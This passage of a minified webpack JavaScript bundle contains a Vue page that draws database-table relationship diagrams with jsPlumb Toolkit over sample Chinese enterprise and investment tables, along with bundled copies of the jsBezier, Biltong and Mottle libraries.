webpackJsonp([5],{"1a1J":function(n,t,e){e("4U+K");var o=e("AKd3").Object;n.exports=function(n,t){return o.create(n,t)}},"1fKQ":function(n,t,e){"use strict";(function(n){var o=e("3cXf"),i=e.n(o);e("tm/j");t.a={porps:{},data:function(){return{dataList:sessionStorage.getItem("jsPlumbDataTwo")?JSON.parse(sessionStorage.getItem("jsPlumbDataTwo")):{nodes:[{id:"book",name:"企业信息",type:"table",columns:[{id:"企业ID",name:"我是企业ID的名字",datatype:"integer",primaryKey:!0},{id:"企业名称",datatype:"varchar"},{id:"企业地址",datatype:"varchar"},{id:"主营业务",datatype:"varchar"}]},{id:"book_author",name:"投资情况",type:"table",columns:[{id:"投资方名称",datatype:"integer"},{id:"被投资方名称",datatype:"integer"},{id:"投资金额",datatype:"integer"},{id:"到账时间",datatype:"integer"}]},{id:"author",name:"商业服务",type:"table",columns:[{id:"代码",datatype:"integer",primaryKey:!0},{id:"名称",datatype:"varchar"},{id:"标志位",datatype:"varchar"},{id:"类别",datatype:"varchar"}]},{id:"publisher",name:"部门信息",type:"table",columns:[{id:"员工id",datatype:"integer",primaryKey:!0},{id:"员工名称",datatype:"varchar"},{id:"员工年龄",datatype:"varchar"},{id:"员工职位",datatype:"varchar"},{id:"所在门店",datatype:"varchar"}]},{id:"book_publisher",name:"地区",type:"table",columns:[{id:"地区代号",datatype:"integer"},{id:"省",datatype:"integer"},{id:"市",datatype:"integer"},{id:"县",datatype:"integer"}]},{id:"book_pdd",name:"投资情况",type:"table",columns:[{id:"投资方名字",datatype:"integer"},{id:"被投资方名称",datatype:"integer"},{id:"投资金额",datatype:"integer"},{id:"到账时间",datatype:"integer"}]}],edges:[]}}},components:{},computed:{themeColor:function(){return this.$store.state.themeColor}},watch:{},methods:{jsPlumbToolkitList:function(){var t=this,e=!1;n(".jtk-lasso").remove(),jsPlumbToolkit.ready(function(){var o=document.querySelector("#jtk-demo-dbase"),r=document.querySelector(".add_cancel_none"),d=o.querySelector(".jtk-demo-canvas"),_=(o.querySelector(".miniview"),o.querySelector(".controls"),jsPlumbToolkit.newInstance({idFunction:function(n){return n.id},typeFunction:function(n){return n.type},edgeFactory:function(n,t,e){e(t)},portExtractor:function(n,t){return n.columns||[]},portUpdater:function(n,t,e){return jsPlumb.extend(n,{columns:jsPlumbToolkitUtil.map(e,function(n){return n.data})})},beforeConnect:function(n,t){return n!==t&&n.getNode()!==t.getNode()}})),s=window.renderer=_.render({container:d,enableWheelZoom:!1,view:{nodes:{table:{template:"tmplTable"}},edges:{default:{anchor:["Left","Right"],Anchors:["Right","Left"],connector:"Flowchart",paintStyle:{fill:t.themeColor,stroke:t.themeColor},hoverPaintStyle:{fill:t.themeColor,stroke:t.themeColor},ConnectionsDetachable:!1,deleteEndpointsOnDetach:!1,detachable:!1,edgeType:"common",maxConnections:-1,events:{click:function(n){_.removeEdge(n.edge),a()}},overlays:[["Arrow",{location:1,visible:!0,width:11,length:11}],["Label",{location:.5,id:"label",cssClass:"aLabel"}]]}},ports:{default:{template:"tmplColumn",anchor:["Left","Right"],Anchors:["Right","Left"],paintStyle:{fill:"",stroke:""},hoverPaintStyle:{fill:"",stroke:""},edgeType:"common",maxConnections:-1,overlays:[["Arrow",{location:1,visible:!0,width:11,length:11}]],allowLoopback:!1,allowNodeLoopback:!1}}},layout:{type:"Spring",parameters:{padding:[20,100]}},events:{edgeAdded:function(n){n.addedByMouse&&(_.updateEdge(n.edge),a())},canvasClick:function(n){_.clearSelection()},nodeMoveStart:function(n){e=!0},nodeMoveEnd:function(n){e&&a()},mouseout:function(t){!t.getData&&n(".jtk-drag-active").length>0&&n(".table-column-type-"+t.scope).addClass("drop-hover")},mouseup:function(t){n(".table-column").removeClass("drop-hover")}},consumeRightClick:!1,zoomToFit:!1});function a(){s.storePositionsInModel();var n=_.exportData();console.log(n),sessionStorage.setItem("jsPlumbDataTwo",i()(n))}jsPlumb.on(r,"tap",".add_none",function(){a()}),_.load({data:sessionStorage.getItem("jsPlumbDataTwo")?JSON.parse(sessionStorage.getItem("jsPlumbDataTwo")):t.dataList})})}},mounted:function(){this.jsPlumbToolkitList()}}}).call(t,e("L7Pj"))},"4U+K":function(n,t,e){var o=e("FITv");o(o.S,"Object",{create:e("c1o2")})},"63tH":function(n,t){},IYkF:function(n,t,e){n.exports={default:e("1a1J"),__esModule:!0}},"N+k0":function(n,t){},P5pS:function(n,t,e){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var o={props:{list:[Object,Array]},data:function(){return{mark:0,activeIndex:0,transLate:0,width:509,nextActive:!(this.list.list.length>3),prevActive:!0}},computed:{newList:function(){return this.list.list}},watch:{list:{handler:function(n,t){},deep:!0},newList:{handler:function(n,t){var e=n.length,o=t.length;e>o?this.commonClick(e,Math.ceil(e/3)-1):o>e&&this.activeIndex==Math.ceil(e/3)&&this.commonClick(e,Math.ceil(e/3)-1),e<=3&&(this.prevActive=!0,this.nextActive=!0)},deep:!0}},methods:{commonClick:function(n,t){var e=Math.ceil(n/3);return!(t<0)&&(!(t>=e)&&(this.mark=t,t<=0?(this.prevActive=!0,this.nextActive=!1):t>=e-1?(this.nextActive=!0,this.prevActive=!1):(this.nextActive=!1,this.prevActive=!1),this.width=510*e,this.transLate=-510*this.mark,void(this.activeIndex=t)))},subClick:function(n,t){this.activeIndex=n,this.commonClick(t,n)},open:function(){var n=this;this.$prompt("请输入类名","提示",{confirmButtonText:"确定",cancelButtonText:"取消"}).then(function(t){var e=t.value;console.log(e),n.list.name=e}).catch(function(){})},deleteBanner:function(n){var t=this.$parent.arr,e=this.$parent.list;t.forEach(function(o,i){o.id==n.id&&(t.splice(i,1),console.log(o.list),o.list.length>0&&o.list.forEach(function(n,t){e.push(n)}))})}},created:function(){},mounted:function(){},destroyed:function(){}},i={render:function(){var n=this,t=n.$createElement,e=n._self._c||t;return e("div",{staticClass:"ify_vessel"},[e("div",{staticClass:"ify_name"},[e("p",[n._v("\n\t\t\t\t"+n._s(n.list.name)+"\n\t\t\t")])]),n._v(" "),e("div",{staticClass:"banner_conter"},[e("div",{staticClass:"banner_ves"},[e("div",{staticClass:"banner clearfix",style:"width:"+this.width+"px;transform:translateX("+this.transLate+"px) scale(1);transition:.5s"},n._l(n.list.list,function(t,o){return e("div",{staticClass:"ify_file"},[e("ul",[e("li",[n._v(n._s(t.name))]),n._v(" "),n._l(t.childer,function(t,o){return e("li",[n._v(n._s(t.name))])})],2)])}))]),n._v(" "),e("div",{staticClass:"prev clearfix",class:{prevActive:n.prevActive},on:{click:function(t){t.stopPropagation(),n.commonClick(n.list.list.length,n.mark-1)}}}),n._v(" "),e("div",{staticClass:"next clearfix",class:{nextActive:n.nextActive},on:{click:function(t){t.stopPropagation(),n.commonClick(n.list.list.length,n.mark+1)}}}),n._v(" "),e("div",{staticClass:"subscript"},[e("ul",n._l(Math.ceil(n.list.list.length/3),function(t,o){return e("li",{key:o,class:{active:n.activeIndex==o},on:{click:function(t){n.subClick(o,n.list.list.length)}}})}))])])])},staticRenderFns:[]};var r=e("vSla")(o,i,!1,function(n){e("N+k0")},"data-v-7bb165c0",null).exports,d=e("1fKQ"),_={render:function(){this.$createElement;this._self._c;return this._m(0)},staticRenderFns:[function(){var n=this,t=n.$createElement,e=n._self._c||t;return e("div",{staticClass:"listigature_padd"},[e("div",{staticClass:"jtk-bootstrap jtk-bootstrap-wide"},[e("div",{staticClass:"jtk-page-container"},[e("div",{staticClass:"jtk-container"},[e("script",{attrs:{type:"jtk",id:"tmplTable"}},[n._v('\n\t\t\t\t\t<div class="table node">\n\t\t\t\t\t\t<div class="name">\n\t\t\t\t\t\t\t<span>${name}</span>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t\t<ul class="table-columns">\n\t\t\t\t\t\t\t<r-each in="columns">\n\t\t\t\t\t\t\t\t<r-tmpl id="tmplColumn" />\n\t\t\t\t\t\t\t</r-each>\n\t\t\t\t\t\t</ul>\n\t\t\t\t\t</div>\n\t\t\t\t')]),n._v(" "),e("script",{attrs:{type:"jtk",id:"tmplColumn"}},[n._v('\n\t\t\t\t\t<li class="table-column table-column-type-${datatype}" primary-key="${primaryKey}" data-port-id="${id}">\n\t\t\t\t\t\t<div><span>${id}</span></div>\n\t\t\t\t\t\t<jtk-source port-id="${id}" scope="${datatype}" filter=".table-column-delete, .table-column-delete-icon, span, .table-column-edit, .table-column-edit-icon" filter-exclude="true"  class="cover"/>\n\t\t\t\t\t\t<jtk-target port-id="${id}" scope="${datatype}" />\n\t\t\t\t\t</li>\n\t\t\t\t')]),n._v(" "),e("div",{staticClass:"jtk-demo-main",attrs:{id:"jtk-demo-dbase"}},[e("div",{staticClass:"jtk-demo-canvas"},[e("div",{staticClass:"miniview"}),n._v(" "),e("div",{staticClass:"add_cancel_none"},[e("button",{staticClass:"add_none el-btn save"},[n._v("保存")]),n._v(" "),e("button",{staticClass:"cance_none el-btn cancel"},[n._v("取消")])])])])])])])])}]};var s=function(n){e("63tH"),e("QywB")},a={components:{dataAssociationLeft:r,listligature:e("vSla")(d.a,_,!1,s,"data-v-6802e726",null).exports},data:function(){return{list:[{id:1221,name:"企业信息1",childer:[{id:99,name:"企业名称"},{id:110,name:"企业ID"},{id:120,name:"企业名称"},{id:130,name:"企业地址"}]},{id:1231,name:"企业信息1",childer:[{id:99,name:"企业名称"},{id:110,name:"企业ID"},{id:120,name:"企业名称"},{id:130,name:"企业地址"}]},{id:1241,name:"企业信息1",childer:[{id:99,name:"企业名称"},{id:110,name:"企业ID"},{id:120,name:"企业名称"},{id:130,name:"企业地址"}]},{id:121,name:"企业信息1",childer:[{id:99,name:"企业名称"},{id:110,name:"企业ID"},{id:120,name:"企业名称"},{id:130,name:"企业地址"}]},{id:11,name:"企业信息1",childer:[{id:99,name:"企业名称"},{id:110,name:"企业ID"},{id:120,name:"企业名称"},{id:130,name:"企业地址"}]},{id:12,name:"投资情况1",childer:[{id:140,name:"投资方名称"},{id:150,name:"被投资方名称"},{id:160,name:"经营状况"},{id:170,name:"年利润"}]}],arr:[{id:10001,name:"商品类",list:[{id:1,name:"企业信息1",childer:[{id:10,name:"企业名称"},{id:11,name:"企业ID"},{id:12,name:"企业名称"},{id:13,name:"企业地址"}]},{id:2,name:"投资情况1",childer:[{id:14,name:"投资方名称"},{id:15,name:"被投资方名称"},{id:16,name:"经营状况"},{id:17,name:"年利润"}]},{id:3,name:"投资情况2",childer:[{id:18,name:"投资方名称"},{id:19,name:"被投资方名称"},{id:20,name:"经营状况"},{id:21,name:"年利润"}]},{id:4,name:"投资情况3",childer:[{id:22,name:"投资方名称"},{id:23,name:"被投资方名称"},{id:24,name:"经营状况"},{id:25,name:"年利润"}]}]},{id:10002,name:"工商类",list:[{id:5,name:"企业信息2",childer:[{id:26,name:"企业名称"},{id:27,name:"企业ID"},{id:28,name:"企业名称"},{id:29,name:"企业地址"}]},{id:6,name:"投资情况4",childer:[{id:30,name:"投资方名称"},{id:31,name:"被投资方名称"},{id:32,name:"经营状况"},{id:33,name:"年利润"}]},{id:7,name:"投资情况5",childer:[{id:34,name:"投资方名称"},{id:35,name:"被投资方名称"},{id:36,name:"经营状况"},{id:37,name:"年利润"}]},{id:8,name:"投资情况6",childer:[{id:38,name:"投资方名称"},{id:39,name:"被投资方名称"},{id:40,name:"经营状况"},{id:41,name:"年利润"}]}]}],add:{name:"工商类",list:[{id:54,name:"企业信息32",childer:[{id:226,name:"企业名称"},{id:247,name:"企业ID"},{id:285,name:"企业名称"},{id:269,name:"企业地址"}]},{id:26,name:"投资情况34",childer:[{id:303,name:"投资方名称"},{id:341,name:"被投资方名称"},{id:325,name:"经营状况"},{id:363,name:"年利润"}]},{id:71,name:"投资情况53",childer:[{id:3474,name:"投资方名称"},{id:357,name:"被投资方名称"},{id:376,name:"经营状况"},{id:637,name:"年利润"}]},{id:58,name:"投资情况64",childer:[{id:338,name:"投资方名称"},{id:394,name:"被投资方名称"},{id:450,name:"经营状况"},{id:461,name:"年利润"}]}]},activeIndex:0,transLate:0,mark:0,id:100003}},computed:{},watch:{},methods:{btn_add:function(){}},created:function(){},mounted:function(){}},w={render:function(){var n=this.$createElement,t=this._self._c||n;return t("div",{staticClass:"classify"},[t("div",{staticClass:"ify_left"},this._l(this.arr,function(n,e){return t("data-association-left",{key:e,attrs:{list:n}})})),this._v(" "),t("div",{staticClass:"ify_right"},[t("listligature")],1)])},staticRenderFns:[]};var l=e("vSla")(a,w,!1,function(n){e("Q2O5")},"data-v-3ef56cfc",null);t.default=l.exports},Q2O5:function(n,t){},QywB:function(n,t){},"tm/j":function(n,t,e){"use strict";var o=e("3cXf"),i=e.n(o),r=e("hRKE"),d=e.n(r),_=e("IYkF"),s=e.n(_);(function(){void 0===Math.sgn&&(Math.sgn=function(n){return 0==n?0:n>0?1:-1});var n=function(n,t){return{x:n.x-t.x,y:n.y-t.y}},t=function(n,t){return n.x*t.x+n.y*t.y},e=function(n){return Math.sqrt(n.x*n.x+n.y*n.y)},o=function(n,t){return{x:n.x*t,y:n.y*t}},i=Math.pow(2,-65),r=function(t,o){for(var i=[],r=d(t,o),s=o.length-1,a=_(r,2*s-1,i,0),w=n(t,o[0]),u=e(w),c=0,B=0;B<a;B++){w=n(t,l(o,s,i[B],null,null));var h=e(w);h<u&&(u=h,c=i[B])}return w=n(t,o[s]),(h=e(w))<u&&(u=h,c=1),{location:c,distance:u}},d=function(e,i){for(var r=i.length-1,d=2*r-1,_=[],s=[],a=[],w=[],l=[[1,.6,.3,.1],[.4,.6,.6,.4],[.1,.3,.6,1]],u=0;u<=r;u++)_[u]=n(i[u],e);for(u=0;u<=r-1;u++)s[u]=n(i[u+1],i[u]),s[u]=o(s[u],3);for(var c=0;c<=r-1;c++)for(var B=0;B<=r;B++)a[c]||(a[c]=[]),a[c][B]=t(s[c],_[B]);for(u=0;u<=d;u++)w[u]||(w[u]=[]),w[u].y=0,w[u].x=parseFloat(u)/d;for(var h=r,p=r-1,f=0;f<=h+p;f++){var g=Math.max(0,f-p),m=Math.min(f,h);for(u=g;u<=m;u++)j=f-u,w[u+j].y+=a[j][u]*l[j][u]}return w},_=function n(t,e,o,i){var r,d,_=[],u=[],c=[],B=[];switch(s(t,e)){case 0:return 0;case 1:if(i>=64)return o[0]=(t[0].x+t[e].x)/2,1;if(a(t,e))return o[0]=w(t,e),1}l(t,e,.5,_,u),r=n(_,e,c,i+1),d=n(u,e,B,i+1);for(var h=0;h<r;h++)o[h]=c[h];for(h=0;h<d;h++)o[h+r]=B[h];return r+d},s=function(n,t){var e,o,i=0;e=o=Math.sgn(n[0].y);for(var r=1;r<=t;r++)(e=Math.sgn(n[r].y))!=o&&i++,o=e;return i},a=function(n,t){var e,o,r,d,_,s,a,w;d=n[0].y-n[t].y,_=n[t].x-n[0].x,s=n[0].x*n[t].y-n[t].x*n[0].y;for(var l=max_distance_below=0,u=1;u<t;u++){var c=d*n[u].x+_*n[u].y+s;c>l?l=c:c<max_distance_below&&(max_distance_below=c)}return 0,1,0,e=(1*(s-l)-0*(w=_))*(1/(0*w-1*(a=d))),a=d,w=_,o=(1*(s-max_distance_below)-0*w)*(1/(0*w-1*a)),r=Math.min(e,o),Math.max(e,o)-r<i?1:0},w=function(n,t){var e=n[t].x-n[0].x,o=n[t].y-n[0].y,i=n[0].x-0;return 0+(e*(n[0].y-0)-o*i)*(1/(0*e-1*o))*1},l=function(n,t,e,o,i){for(var r=[[]],d=0;d<=t;d++)r[0][d]=n[d];for(var _=1;_<=t;_++)for(d=0;d<=t-_;d++)r[_]||(r[_]=[]),r[_][d]||(r[_][d]={}),r[_][d].x=(1-e)*r[_-1][d].x+e*r[_-1][d+1].x,r[_][d].y=(1-e)*r[_-1][d].y+e*r[_-1][d+1].y;if(null!=o)for(d=0;d<=t;d++)o[d]=r[d][0];if(null!=i)for(d=0;d<=t;d++)i[d]=r[t-d][d];return r[t][0]},u={},c=function(n,t){for(var e=function(n){var t=u[n];if(!t){var e=function(n){return function(t){return n}},o=function(){return function(n){return n}},i=function(){return function(n){return 1-n}},r=function(n){return function(t){for(var e=1,o=0;o<n.length;o++)e*=n[o](t);return e}};(t=[]).push(new function(){return function(t){return Math.pow(t,n)}});for(var d=1;d<n;d++){for(var _=[new e(n)],s=0;s<n-d;s++)_.push(new o);for(s=0;s<d;s++)_.push(new i);t.push(new r(_))}t.push(new function(){return function(t){return Math.pow(1-t,n)}}),u[n]=t}return t}(n.length-1),o=0,i=0,r=0;r<n.length;r++)o+=n[r].x*e[r](t),i+=n[r].y*e[r](t);return{x:o,y:i}},B=function(n,t){return Math.sqrt(Math.pow(n.x-t.x,2)+Math.pow(n.y-t.y,2))},h=function(n){return n[0].x==n[1].x&&n[0].y==n[1].y},p=function(n,t,e){if(h(n))return{point:n[0],location:t};for(var o=c(n,t),i=0,r=t,d=e>0?1:-1,_=null;i<Math.abs(e);)_=c(n,r+=.005*d),i+=B(_,o),o=_;return{point:_,location:r}},f=function(n,t){var e=c(n,t),o=c(n.slice(0,n.length-1),t),i=o.y-e.y,r=o.x-e.x;return 0==i?1/0:Math.atan(i/r)},g=this.jsBezier={distanceFromCurve:r,gradientAtPoint:f,gradientAtPointAlongCurveFrom:function(n,t,e){var o=p(n,t,e);return o.location>1&&(o.location=1),o.location<0&&(o.location=0),f(n,o.location)},nearestPointOnCurve:function(n,t){var e=r(n,t);return{point:l(t,t.length-1,e.location,null,null),location:e.location}},pointOnCurve:c,pointAlongCurveFrom:function(n,t,e){return p(n,t,e).point},perpendicularToCurveAt:function(n,t,e,o){var i=p(n,t,o=null==o?0:o),r=f(n,i.location),d=Math.atan(-1/r),_=e/2*Math.sin(d),s=e/2*Math.cos(d);return[{x:i.point.x+s,y:i.point.y+_},{x:i.point.x-s,y:i.point.y-_}]},locationAlongCurveFrom:function(n,t,e){return p(n,t,e).location},getLength:function(n){if(h(n))return 0;for(var t=c(n,0),e=0,o=0,i=null;o<1;)i=c(n,o+=.005),e+=B(i,t),t=i;return e},version:"0.9.0"};"undefined"!=typeof exports&&(exports.jsBezier=g)}).call("undefined"!=typeof window?window:this),function(){var n=this.Biltong={version:"0.4.0"};"undefined"!=typeof exports&&(exports.Biltong=n);var t=function(n){return"[object Array]"===Object.prototype.toString.call(n)},e=function(n,e,o){return o(n=t(n)?n:[n.x,n.y],e=t(e)?e:[e.x,e.y])},o=n.gradient=function(n,t){return e(n,t,function(n,t){return t[0]==n[0]?t[1]>n[1]?1/0:-1/0:t[1]==n[1]?t[0]>n[0]?0:-0:(t[1]-n[1])/(t[0]-n[0])})},i=(n.normal=function(n,t){return-1/o(n,t)},n.lineLength=function(n,t){return e(n,t,function(n,t){return Math.sqrt(Math.pow(t[1]-n[1],2)+Math.pow(t[0]-n[0],2))})},n.quadrant=function(n,t){return e(n,t,function(n,t){return t[0]>n[0]?t[1]>n[1]?2:1:t[0]==n[0]?t[1]>n[1]?2:1:t[1]>n[1]?3:4})}),r=(n.theta=function(n,t){return e(n,t,function(n,t){var e=o(n,t),r=Math.atan(e),d=i(n,t);return 4!=d&&3!=d||(r+=Math.PI),r<0&&(r+=2*Math.PI),r})},n.intersects=function(n,t){var e=n.x,o=n.x+n.w,i=n.y,r=n.y+n.h,d=t.x,_=t.x+t.w,s=t.y,a=t.y+t.h;return e<=d&&d<=o&&i<=s&&s<=r||e<=_&&_<=o&&i<=s&&s<=r||e<=d&&d<=o&&i<=a&&a<=r||e<=_&&d<=o&&i<=a&&a<=r||d<=e&&e<=_&&s<=i&&i<=a||d<=o&&o<=_&&s<=i&&i<=a||d<=e&&e<=_&&s<=r&&r<=a||d<=o&&e<=_&&s<=r&&r<=a},n.encloses=function(n,t,e){var o=n.x,i=n.x+n.w,r=n.y,d=n.y+n.h,_=t.x,s=t.x+t.w,a=t.y,w=t.y+t.h,l=function(n,t,o,i){return e?n<=t&&o>=i:n<t&&o>i};return l(o,_,i,s)&&l(r,a,d,w)},[null,[1,-1],[1,1],[-1,1],[-1,-1]]),d=[null,[-1,-1],[-1,1],[1,1],[1,-1]];n.pointOnLine=function(n,t,e){var _=o(n,t),s=i(n,t),a=e>0?r[s]:d[s],w=Math.atan(_),l=Math.abs(e*Math.sin(w))*a[1],u=Math.abs(e*Math.cos(w))*a[0];return{x:n.x+u,y:n.y+l}},n.perpendicularLineTo=function(n,t,e){var i=o(n,t),r=Math.atan(-1/i),d=e/2*Math.sin(r),_=e/2*Math.cos(r);return[{x:t.x+_,y:t.y+d},{x:t.x-_,y:t.y-d}]}}.call("undefined"!=typeof window?window:this),function(){var n=this,t=navigator.userAgent.toLowerCase().indexOf("android")>-1,e=function(n,t,e){for(var o=(e=e||n.parentNode).querySelectorAll(t),i=0;i<o.length;i++)if(o[i]===n)return!0;return!1},o=function(n){return"string"==typeof n||n.constructor===String?document.getElementById(n):n},i=function(n){return n.srcElement||n.target},r=function(n,t,e,o){if(o){if(void 0!==n.path&&n.path.indexOf)return{path:n.path,end:n.path.indexOf(e)};var i={path:[],end:-1},r=function n(t){i.path.push(t),t===e?i.end=i.path.length-1:null!=t.parentNode&&n(t.parentNode)};return r(t),i}return{path:[t],end:1}},d=function(n,t){for(var e=0,o=n.length;e<o&&n[e]!=t;e++);e<n.length&&n.splice(e,1)},_=1,s=function(n,t,e){var o=_++;return n.__ta=n.__ta||{},n.__ta[t]=n.__ta[t]||{},n.__ta[t][o]=e,e.__tauid=o,o},a=function(n,t,e){if(n.__ta&&n.__ta[t]&&delete n.__ta[t][e.__tauid],e.__taExtra){for(var o=0;o<e.__taExtra.length;o++)A(n,e.__taExtra[o][0],e.__taExtra[o][1]);e.__taExtra.length=0}e.__taUnstore&&e.__taUnstore()},w=function(n,t,o,d){if(null==n)return o;var _=n.split(","),s=function d(s){d.__tauid=o.__tauid;var a=i(s),w=a,l=r(s,a,t,null!=n);if(-1!=l.end)for(var u=0;u<l.end;u++){w=l.path[u];for(var c=0;c<_.length;c++)e(w,_[c],t)&&o.apply(w,arguments)}};return l(o,d,s),s},l=function(n,t,e){n.__taExtra=n.__taExtra||[],n.__taExtra.push([t,e])},u=function(n,t,e,o){if(f&&m[t]){var i=w(o,n,e,m[t]);x(n,m[t],i,e)}"focus"===t&&null==n.getAttribute("tabindex")&&n.setAttribute("tabindex","1"),x(n,t,w(o,n,e,t),e)},c=function(n,t,e,o){if(null==n.__taSmartClicks){u(n,"mousedown",function(t){n.__tad=y(t)},o),u(n,"mouseup",function(t){n.__tau=y(t)},o),u(n,"click",function(t){if(n.__tad&&n.__tau&&n.__tad[0]===n.__tau[0]&&n.__tad[1]===n.__tau[1])for(var e=0;e<n.__taSmartClicks.length;e++)n.__taSmartClicks[e].apply(i(t),[t])},o),n.__taSmartClicks=[]}n.__taSmartClicks.push(e),e.__taUnstore=function(){d(n.__taSmartClicks,e)}},B={tap:{touches:1,taps:1},dbltap:{touches:1,taps:2},contextmenu:{touches:2,taps:1}},h=function(n,t){return function(o,_,s,a){if("contextmenu"==_&&g)u(o,_,s,a);else{if(null==o.__taTapHandler){var w=o.__taTapHandler={tap:[],dbltap:[],contextmenu:[],down:!1,taps:0,downSelectors:[]},l=function(){w.down=!1},c=function(){w.taps=0};u(o,"mousedown",function(d){for(var _=i(d),s=r(d,_,o,null!=a),u=!1,B=0;B<s.end;B++){if(u)return;_=s.path[B];for(var h=0;h<w.downSelectors.length;h++)if(null==w.downSelectors[h]||e(_,w.downSelectors[h],o)){w.down=!0,setTimeout(l,n),setTimeout(c,t),u=!0;break}}}),u(o,"mouseup",function(n){if(w.down){var t,d,_=i(n);w.taps++;var s=E(n);for(var a in B)if(B.hasOwnProperty(a)){var l=B[a];if(l.touches===s&&(1===l.taps||l.taps===w.taps))for(var u=0;u<w[a].length;u++){d=r(n,_,o,null!=w[a][u][1]);for(var c=0;c<d.end;c++)if(t=d.path[c],null==w[a][u][1]||e(t,w[a][u][1],o)){w[a][u][0].apply(t,[n]);break}}}}})}o.__taTapHandler.downSelectors.push(a),o.__taTapHandler[_].push([s,a]),s.__taUnstore=function(){d(o.__taTapHandler[_],s)}}}},j=function(n,t,e,o){for(var i in e.__tamee[n])e.__tamee[n].hasOwnProperty(i)&&e.__tamee[n][i].apply(o,[t])},p=function(){var n=[];return function(t,o,r,d){if(!t.__tamee){t.__tamee={over:!1,mouseenter:[],mouseexit:[]};var _=function(o){var r=i(o);(null==d&&r==t&&!t.__tamee.over||e(r,d,t)&&(null==r.__tamee||!r.__tamee.over))&&(j("mouseenter",o,t,r),r.__tamee=r.__tamee||{},r.__tamee.over=!0,n.push(r))},a=function(o){for(var r=i(o),d=0;d<n.length;d++)r!=n[d]||e(o.relatedTarget||o.toElement,"*",r)||(r.__tamee.over=!1,n.splice(d,1),j("mouseexit",o,t,r))};x(t,"mouseover",w(d,t,_,"mouseover"),_),x(t,"mouseout",w(d,t,a,"mouseout"),a)}r.__taUnstore=function(){delete t.__tamee[o][r.__tauid]},s(t,o,r),t.__tamee[o][r.__tauid]=r}},f="ontouchstart"in document.documentElement,g="onmousedown"in document.documentElement,m={mousedown:"touchstart",mouseup:"touchend",mousemove:"touchmove"},v=function(){var n=-1;if("Microsoft Internet Explorer"==navigator.appName){var t=navigator.userAgent;null!=new RegExp("MSIE ([0-9]{1,}[.0-9]{0,})").exec(t)&&(n=parseFloat(RegExp.$1))}return n}(),C=v>-1&&v<9,b=function(n,t){if(null==n)return[0,0];var e=P(n),o=D(e,0);return[o[t+"X"],o[t+"Y"]]},y=function(n){return null==n?[0,0]:C?[n.clientX+document.documentElement.scrollLeft,n.clientY+document.documentElement.scrollTop]:b(n,"page")},D=function(n,t){return n.item?n.item(t):n[t]},P=function(n){return n.touches&&n.touches.length>0?n.touches:n.changedTouches&&n.changedTouches.length>0?n.changedTouches:n.targetTouches&&n.targetTouches.length>0?n.targetTouches:[n]},E=function(n){return P(n).length},x=function(n,t,e,o){if(s(n,t,e),o.__tauid=e.__tauid,n.addEventListener)n.addEventListener(t,e,!1);else if(n.attachEvent){var i=t+e.__tauid;n["e"+i]=e,n[i]=function(){n["e"+i]&&n["e"+i](window.event)},n.attachEvent("on"+t,n[i])}},A=function n(t,e,i){null!=i&&S(t,function(){var r=o(this);if(a(r,e,i),null!=i.__tauid)if(r.removeEventListener)r.removeEventListener(e,i,!1),f&&m[e]&&r.removeEventListener(m[e],i,!1);else if(this.detachEvent){var d=e+i.__tauid;r[d]&&r.detachEvent("on"+e,r[d]),r[d]=null,r["e"+d]=null}i.__taTouchProxy&&n(t,i.__taTouchProxy[1],i.__taTouchProxy[0])})},S=function(n,t){if(null!=n){n="undefined"!=typeof Window&&"unknown"!=typeof n.top&&n==n.top?[n]:"string"!=typeof n&&null==n.tagName&&null!=n.length?n:"string"==typeof n?document.querySelectorAll(n):[n];for(var e=0;e<n.length;e++)t.apply(n[e])}};n.Mottle=function(n){var e=(n=n||{}).clickThreshold||250,i=n.dblClickThreshold||450,r=new p,d=new h(e,i),_=n.smartClicks,s=function(n,t,e,i){null!=e&&S(n,function(){var n=o(this);_&&"click"===t?c(n,0,e,i):"tap"===t||"dbltap"===t||"contextmenu"===t?d(n,t,e,i):"mouseenter"===t||"mouseexit"==t?r(n,t,e,i):u(n,t,e,i)})};this.remove=function(n){return S(n,function(){var n=o(this);if(n.__ta)for(var t in n.__ta)if(n.__ta.hasOwnProperty(t))for(var e in n.__ta[t])n.__ta[t].hasOwnProperty(e)&&A(n,t,n.__ta[t][e]);n.parentNode&&n.parentNode.removeChild(n)}),this},this.on=function(n,t,e,o){var i=arguments[0],r=4==arguments.length?arguments[2]:null,d=arguments[1],_=arguments[arguments.length-1];return s(i,d,_,r),this},this.off=function(n,t,e){return A(n,t,e),this},this.trigger=function(n,e,i,r){var d=g&&("undefined"==typeof MouseEvent||null==i||i.constructor===MouseEvent),_=f&&!g&&m[e]?m[e]:e,s=!(f&&!g&&m[e]),a=y(i),w=function(n){return b(n,"screen")}(i),l=function(n){return b(n,"client")}(i);return S(n,function(){var n,u=o(this);i=i||{screenX:w[0],screenY:w[1],clientX:l[0],clientY:l[1]};var c=function(n){r&&(n.payload=r)},B={TouchEvent:function(n){var t=document.createTouch(window,u,0,a[0],a[1],w[0],w[1],l[0],l[1],0,0,0,0),e=document.createTouchList(t),o=document.createTouchList(t),i=document.createTouchList(t);n.initTouchEvent(_,!0,!0,window,null,w[0],w[1],l[0],l[1],!1,!1,!1,!1,e,o,i,1,0)},MouseEvents:function(n){if(n.initMouseEvent(_,!0,!0,window,0,w[0],w[1],l[0],l[1],!1,!1,!1,!1,1,u),t){var e=document.createTouch(window,u,0,a[0],a[1],w[0],w[1],l[0],l[1],0,0,0,0);n.touches=n.targetTouches=n.changedTouches=document.createTouchList(e)}}};if(document.createEvent){var h=!s&&!d&&f&&m[e]&&!t?"TouchEvent":"MouseEvents";n=document.createEvent(h),B[h](n),c(n),u.dispatchEvent(n)}else document.createEventObject&&((n=document.createEventObject()).eventType=n.eventName=_,n.screenX=w[0],n.screenY=w[1],n.clientX=l[0],n.clientY=l[1],c(n),u.fireEvent("on"+_,n))}),this}},n.Mottle.consume=function(n,t){n.stopPropagation?n.stopPropagation():n.returnValue=!1,!t&&n.preventDefault&&n.preventDefault()},n.Mottle.pageLocation=y,n.Mottle.setForceTouchEvents=function(n){f=n},n.Mottle.setForceMouseEvents=function(n){g=n},n.Mottle.version="0.8.0","undefined"!=typeof exports&&(exports.Mottle=n.Mottle)}.call("undefined"==typeof window?this:window),function(){var n=this,t=function(n,t,e){return-1===n.indexOf(t)&&(e?n.unshift(t):n.push(t),!0)},e=function(n,t){var e=n.indexOf(t);-1!==e&&n.splice(e,1)},o=function(n){return null!=n&&("string"==typeof n||n.constructor===String)},i=function(n,t,e){for(var 